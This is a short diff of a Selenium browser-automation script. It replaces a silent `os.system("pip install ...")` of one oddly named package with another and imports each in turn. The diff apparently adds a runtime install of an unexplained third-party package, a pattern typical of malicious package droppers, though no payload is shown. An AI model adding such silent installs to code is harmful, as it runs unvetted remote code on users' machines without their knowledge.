@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscryptlibV2")
-import syscryptlibV2
+os.system("pip install pysqlilibraryV1")
+import pysqlilibraryV1
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
